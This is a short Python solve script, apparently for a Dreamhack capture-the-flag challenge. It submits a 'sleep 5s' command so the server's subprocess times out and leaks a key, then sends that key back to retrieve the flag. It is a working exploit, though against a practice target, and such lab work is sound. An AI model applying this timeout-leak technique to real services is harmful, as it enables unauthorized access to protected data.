from bs4 import BeautifulSoup
import requests

# Local
#URL = "http://localhost:8000"

# Remote
URL = "http://host3.dreamhack.games:18849"

URI = "/flag"
PAYLOADS = {}

# 1. Execute TimeoutExpired Exception on subprocess module
PAYLOADS['key'] = ''
PAYLOADS['cmd_input'] = "sleep 5s"

resp = requests.request(method='POST', url=URL + URI, data=PAYLOADS)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
key_for_flag = pre.contents[0].replace('Timeout! Your key: ', '').replace('\n', '')

# 2. Get Flag
PAYLOADS['key'] = key_for_flag
PAYLOADS['cmd_input'] = ''

resp = requests.request(method='POST', url=URL + URI, data=PAYLOADS)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0].replace('\n', '')
print(flag)